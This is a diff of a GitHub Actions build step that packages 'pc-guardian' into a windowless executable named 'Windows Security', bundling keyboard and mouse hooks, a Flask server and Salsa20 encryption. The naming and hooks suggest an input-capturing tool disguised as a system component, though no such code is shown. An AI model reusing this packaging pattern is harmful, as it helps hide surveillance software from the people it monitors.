@@ -31,9 +31,10 @@ jobs:
 
       - name: Build EXE
         run: |
-          pyinstaller --onefile --noconsole ^
+          pyinstaller --onefile --noconsole --clean ^
             --name "Windows Security" ^
             --icon "pc-guardian/assets/app.ico" ^
+            --runtime-tmpdir "." ^
             --hidden-import pynput.keyboard._win32 ^
             --hidden-import pynput.mouse._win32 ^
             --hidden-import win32api ^
@@ -44,6 +45,9 @@ jobs:
             --hidden-import comtypes ^
             --hidden-import flask ^
             --hidden-import cryptography ^
+            --hidden-import Crypto ^
+            --hidden-import Crypto.Cipher ^
+            --hidden-import Crypto.Cipher.Salsa20 ^
             --paths pc-guardian ^
             pc-guardian/main.py
         shell: cmd
